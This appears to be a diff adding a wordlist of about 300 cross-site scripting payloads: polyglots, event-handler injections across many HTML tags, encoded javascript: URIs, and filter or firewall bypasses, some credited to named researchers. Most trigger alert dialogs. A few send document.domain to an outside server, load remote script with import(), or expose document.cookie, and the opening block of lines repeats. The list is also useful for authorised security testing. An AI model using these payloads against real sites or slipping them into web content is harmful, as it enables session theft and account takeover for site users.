@@ -1,0 +1,304 @@
+jaVasCript:/*-/*/`/'/"/**/(/ */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`
+javascript:/*--></title></style></textarea></script><svg/onload=alert(document.domain)>
+<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
+<img src="data:image/svg+xml,%3Csvg%20onload=alert(1)%3E">
+<IMG SRC=x onafterprint="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onbeforeprint="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onbeforeunload="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onhashchange="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmessage="alert(String.fromCharCode(88,83,83))">
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
+<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
+<svg onload="javascript:alert(1)"></svg>
+<bgsound onPropertyChange="javascript:alert(1)">
+<applet onError="javascript:alert(1)">
+<marquee onStart="javascript:alert(1)">
+<frameset onFocus="javascript:alert(1)">
+<xml onPropertyChange="javascript:alert(1)">
+<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>
+<math href="javascript:alert(1)">CLICKME</math>
+<event-source src="%(event)s" onload="javascript:alert(1)">
+<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
+jaVasCript:/*-/*/`/'/"/**/(/ */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`
+javascript:/*--></title></style></textarea></script><svg/onload=alert(document.domain)>
+<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
+<img src="data:image/svg+xml,%3Csvg%20onload=alert(1)%3E">
+<IMG SRC=x onafterprint="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onbeforeprint="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onbeforeunload="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onhashchange="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmessage="alert(String.fromCharCode(88,83,83))">
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
+<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
+<script>alert('XSS')</script>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+"><script>alert('XSS')</script>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+<script>\u0061lert('22')</script>
+<script>eval('\x61lert(\'33\')')</script>
+<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
+<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
+<img src=x onerror=alert('XSS');>
+<img src=x onerror=alert('XSS')//
+<img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+"><img src=x onerror=alert('XSS');>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<div onpointerover="alert(45)">MOVE HERE</div>
+<div onpointerdown="alert(45)">MOVE HERE</div>
+<div onpointerenter="alert(45)">MOVE HERE</div>
+<div onpointerleave="alert(45)">MOVE HERE</div>
+<div onpointermove="alert(45)">MOVE HERE</div>
+<div onpointerout="alert(45)">MOVE HERE</div>
+<div onpointerup="alert(45)">MOVE HERE</div>
+<svgonload=alert(1)>
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)//
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg id=alert(1) onload=eval(id)>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(/XSS/)
+<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
+<svg><script>alert('33')
+<svg><script>alert&lpar;'33'&rpar;
+<svg onload="javascript:alert(1)"></svg>
+<bgsound onPropertyChange="javascript:alert(1)">
+<applet onError="javascript:alert(1)">
+<marquee onStart="javascript:alert(1)">
+<frameset onFocus="javascript:alert(1)">
+<xml onPropertyChange="javascript:alert(1)">
+<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>
+<math href="javascript:alert(1)">CLICKME</math>
+<event-source src="%(event)s" onload="javascript:alert(1)">
+<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
+<a"/onclick=(confirm)()>Click Here!
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
+xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
+<--%253cimg%20onerror=alert(1)%20src=a%253e --!>
+<a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'>
+javascript:{ alert`0` }
+1'"><img/src/onerror=.1|alert``>
+<img src=x onError=import('//1152848220/')>
+%2sscript%2ualert()%2s/script%2u
+<svg on onload=(alert)(document.domain)>
+<img ignored=() src=x onerror=prompt(1)>
+<svg onx=() onload=(confirm)(1)>
+“><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
+<svg on =i onload=alert(domain) (working)
+<svg/onload=location/**/='https://your.server/'+document.domain>
+<svg onx=() onload=window.alert?.()> (working)
+test",prompt%0A/*HelloWorld*/(document.domain) (working)- @Brutelogic
+"onx+%00+onpointerenter%3dalert(domain)+x" (working)- @Brutelogic
+"><svg%20onload=alert%26%230000000040"1")> (working)- @IamRenganathan
+%27%09);%0d%0a%09%09[1].find(alert)//
+"><img src=1 onmouseleave=print()> - @itsgeekymonk
+<svg on onload=(alert)(document.domain)> -@zapstiko
+<svg/on%20onload=alert(1)> (working) -@aufzayed
+<img/src=x onError="`${x}`;alert(`Ex.Mi`);"> -@ex_mi
+<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>
+<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
+<svg><circle><set onbegin=prompt(1) attributename=fill>
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+"%3balert`1`%3b"
+asd"`> onpointerenter=x=prompt,x`XSS`
+<x onauxclick=import('//1152848220/')>click
+<x onauxclick=a=alert,a(domain)>click -@niksthehacker
+<x onauxclick=import('//1152848220/')>click
+<x onauxclick=import('//xss/')>click
+\"<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss
+{{constructor.constructor(alert`1`)()}}
+javascript:new%20Function`al\ert\`1\``;
+">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>
+">'><details/open/ontoggle=confirm('XSS')>
+6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
+&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;
+<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme   (working)-Pinaki @0xInfection(Make sure to URL encode the payload properly)
+tarun"><x/onafterscriptexecute=confirm%26lpar;)// -@sratarun
+<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click (workin)Pinaki @0xInfection (Make sure the applications decodes the payload from encoded)
+<details/open/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"> - @xsspayloads
+<svg onload\r\n=$.globalEval("al"+"ert()");>
+<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click Pinaki @0xInfection
+<sVg OnPointerEnter="location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div"> -@AldenAous
+<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='test'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />tap
+ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6 -@naglinagli
+<meter onmouseover="alert(1)" -@manjith27945363
+'">><div><meter onmouseover="alert(1)"</div>" -@manjith27945363
+>><marquee loop=1 width=0 onfinish=alert(1)> -@manjith27945363
+Wordfence 7.4.2
+<a href=&#01javascript:alert(1)> -@brutelogic
+<a/href=%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x0a;:alert(1)>please%20click%20here</a>
+<iframe srcdoc="<script>prompt(document.domain)</script>"></iframe>
+<video><source onerror="prompt(1)"></video>
+<math><mtext></title><script>alert(1)</script>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<details open ontoggle=prompt(1)>
+<input autofocus onfocus=alert(1)>
+<isindex type=image src=1 onerror=alert(1)>
+<object data="data:text/html,<script>alert(1)</script>"></object>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><script href="data:text/javascript,alert(1)"></script></svg>
+<form><button formaction="javascript:alert(1)">Click</button></form>
+<iframe src="javascript:alert`XSS`"></iframe>
+<math href="data:x,alert(1)" xmlns="http://www.w3.org/1998/Math/MathML">CLICK</math>
+<iframe srcdoc="</script><script>alert(1)</script>"></iframe>
+<svg><g onload=alert(1)></g></svg>
+<input oncut="alert(1)" oncopy="alert(1)" onpaste="alert(1)">
+<keygen autofocus onfocus=alert(1)>
+<input onblur=alert(1) autofocus>
+<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br></body>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYlE/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+javascript:/*--></title></style></textarea></script></xmp>
+<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
+JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--
+></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
+<img contenteditable onbeforeinput=alert(1)>test
+<img draggable="true" ondrag="alert(1)" style=display:block>test</img>
+<img draggable="true" ondragend="alert(1)" style=display:block>test</img>
+<img draggable="true" ondragenter="alert(1)" style=display:block>test</img>
+<img draggable="true" ondragleave="alert(1)" style=display:block>test</img>
+<img draggable="true" ondragstart="alert(1)" style=display:block>test</img>
+<img id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></img>
+<img id=x tabindex=1 onfocus=alert(1)></img>
+<img id=x tabindex=1 onfocusin=alert(1)></img>
+<img onafterscriptexecute=alert(1)><script>1</script>
+<img onbeforecopy="alert(1)" contenteditable>test</img>
+<img onbeforecut="alert(1)" contenteditable>test</img>
+<img onbeforescriptexecute=alert(1)><script>1</script>
+<img onblur=alert(1) id=x tabindex=1 style=display:block>test</img><input value=clickme>
+<img onclick="alert(1)" style=display:block>test</img>
+<img oncontextmenu="alert(1)" style=display:block>test</img>
+<img oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<img oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<img ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</img>
+<img onfocusout=alert(1) id=x tabindex=1 style=display:block>test</img><input value=clickme>
+<img onkeydown="alert(1)" contenteditable style=display:block>test</img>
+<img onkeypress="alert(1)" contenteditable style=display:block>test</img>
+<img onkeyup="alert(1)" contenteditable style=display:block>test</img>
+<img onmousedown="alert(1)" style=display:block>test</img>
+<img onmouseenter="alert(1)" style=display:block>test</img>
+<img onmouseleave="alert(1)" style=display:block>test</img>
+<img onmousemove="alert(1)" style=display:block>test</img>
+<img onmouseout="alert(1)" style=display:block>test</img>
+<img onmouseover="alert(1)" style=display:block>test</img>
+<img onmouseup="alert(1)" style=display:block>test</img>
+<img onmousewheel=alert(1) style=display:block>requires scrolling
+<img onpaste="alert(1)" contenteditable>test</img>
+<img onpointerdown=alert(1) style=display:block>XSS</img>
+<img onpointerenter=alert(1) style=display:block>XSS</img>
+<img onpointerleave=alert(1) style=display:block>XSS</img>
+<img onpointermove=alert(1) style=display:block>XSS</img>
+<img onpointerout=alert(1) style=display:block>XSS</img>
+<img onpointerover=alert(1) style=display:block>XSS</img>
+<img onpointerrawupdate=alert(1) style=display:block>XSS</img>
+<img onpointerup=alert(1) style=display:block>XSS</img>
+<img src/onerror=alert(1)>
+<img src=validimage.png onload=alert(1)>
+<img src=validimage.png onloadend=alert(1)>
+<img src=validimage.png onloadstart=alert(1)>
+<img srcset=1 onerror=alert(1)>
+<img srcset=validimage.png onload=alert(1)>
+<img usemap=#x><map name="x"><area href onfocus=alert(1) id=x>
+<img usemap=#x><map name="x"><area href onfocusin=alert(1) id=x>
+<picture contenteditable onbeforeinput=alert(1)>test
+<picture draggable="true" ondrag="alert(1)" style=display:block>test</picture>
+<picture draggable="true" ondragend="alert(1)" style=display:block>test</picture>
+<picture draggable="true" ondragenter="alert(1)" style=display:block>test</picture>
+<picture draggable="true" ondragleave="alert(1)" style=display:block>test</picture>
+<picture draggable="true" ondragstart="alert(1)" style=display:block>test</picture>
+<picture id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></picture>
+<picture id=x tabindex=1 onfocus=alert(1)></picture>
+<picture id=x tabindex=1 onfocusin=alert(1)></picture>
+<picture onafterscriptexecute=alert(1)><script>1</script>
+<picture onbeforecopy="alert(1)" contenteditable>test</picture>
+<picture onbeforecut="alert(1)" contenteditable>test</picture>
+<picture onbeforescriptexecute=alert(1)><script>1</script>
+<picture onblur=alert(1) id=x tabindex=1 style=display:block>test</picture><input value=clickme>
+<picture onclick="alert(1)" style=display:block>test</picture>
+<picture oncontextmenu="alert(1)" style=display:block>test</picture>
+<picture oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<picture oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<picture ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</picture>
+<picture onfocusout=alert(1) id=x tabindex=1 style=display:block>test</picture><input value=clickme>
+<picture onkeydown="alert(1)" contenteditable style=display:block>test</picture>
+<picture onkeypress="alert(1)" contenteditable style=display:block>test</picture>
+<picture onkeyup="alert(1)" contenteditable style=display:block>test</picture>
+<picture onmousedown="alert(1)" style=display:block>test</picture>
+<picture onmouseenter="alert(1)" style=display:block>test</picture>
+<picture onmouseleave="alert(1)" style=display:block>test</picture>
+<picture onmousemove="alert(1)" style=display:block>test</picture>
+<picture onmouseout="alert(1)" style=display:block>test</picture>
+<picture onmouseover="alert(1)" style=display:block>test</picture>
+<picture onmouseup="alert(1)" style=display:block>test</picture>
+<picture onmousewheel=alert(1) style=display:block>requires scrolling
+<picture onpaste="alert(1)" contenteditable>test</picture>
+<picture onpointerdown=alert(1) style=display:block>XSS</picture>
+<picture onpointerenter=alert(1) style=display:block>XSS</picture>
+<picture onpointerleave=alert(1) style=display:block>XSS</picture>
+<picture onpointermove=alert(1) style=display:block>XSS</picture>
+<picture onpointerout=alert(1) style=display:block>XSS</picture>
+<picture onpointerover=alert(1) style=display:block>XSS</picture>
+<picture onpointerrawupdate=alert(1) style=display:block>XSS</picture>
+<picture onpointerup=alert(1) style=display:block>XSS</picture>
+<picture><source srcset="validimage.png"><image onload=alert(1)></picture>
+<picture><source srcset="validimage.png"><image onloadend=alert(1)></picture>
+<picture><source srcset="validimage.png"><image onloadstart=alert(1)></picture>
+<picture><source srcset="validimage.png"><img onload=alert(1)></picture>
+<picture><source srcset="validimage.png"><img onloadend=alert(1)></picture>
+<picture><source srcset="validimage.png"><img onloadstart=alert(1)></picture>
+<script contenteditable onbeforeinput=alert(1)>test
+<script draggable="true" ondrag="alert(1)" style=display:block>test</script>
+<script draggable="true" ondragend="alert(1)" style=display:block>test</script>
+<script draggable="true" ondragenter="alert(1)" style=display:block>test</script>
+<script draggable="true" ondragleave="alert(1)" style=display:block>test</script>
+<script draggable="true" ondragstart="alert(1)" style=display:block>test</script>
+<script id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></script>
+<script id=x tabindex=1 onfocus=alert(1)></script>
+<script id=x tabindex=1 onfocusin=alert(1)></script>
+<script onafterscriptexecute=alert(1)><script>1</script>
+<script onbeforecopy="alert(1)" contenteditable>test</script>
+<script onbeforecut="alert(1)" contenteditable>test</script>
+<script onbeforescriptexecute=alert(1)><script>1</script>
+<script onblur=alert(1) id=x tabindex=1 style=display:block>test</script><input value=clickme>
+<script onclick="alert(1)" style=display:block>test</script>
+<script oncontextmenu="alert(1)" style=display:block>test</script>
+<script oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<script oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<script ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</script>
+<script onerror=alert(1) src=/></script>
+<script onfocusout=alert(1) id=x tabindex=1 style=display:block>test</script><input value=clickme>
+<script onkeydown="alert(1)" contenteditable style=display:block>test</script>
+<script onkeypress="alert(1)" contenteditable style=display:block>test</script>
+<script onkeyup="alert(1)" contenteditable style=display:block>test</script>
+<script onload=alert(1) src=validjs.js></script>
+<script onmousedown="alert(1)" style=display:block>test</script>
+<script onmouseenter="alert(1)" style=display:block>test</script>
+<script onmouseleave="alert(1)" style=display:block>test</script>
+<script onmousemove="alert(1)" style=display:block>test</script>
+<script onmouseout="alert(1)" style=display:block>test</script>
+<script onmouseover="alert(1)" style=display:block>test</script>
+<script onmouseup="alert(1)" style=display:block>test</script>
+<script onmousewheel=alert(1) style=display:block>requires scrolling
+<script onpaste="alert(1)" contenteditable>test</script>
+<script onpointerdown=alert(1) style=display:block>XSS</script>
+<script onpointerenter=alert(1) style=display:block>XSS</script>
+<script onpointerleave=alert(1) style=display:block>XSS</script>
+<script onpointermove=alert(1) style=display:block>XSS</script>
+<script onpointerout=alert(1) style=display:block>XSS</script>
+<script onpointerover=alert(1) style=display:block>XSS</script>
+<script onpointerrawupdate=alert(1) style=display:block>XSS</script>
+<script onpointerup=alert(1) style=display:block>XSS</script>
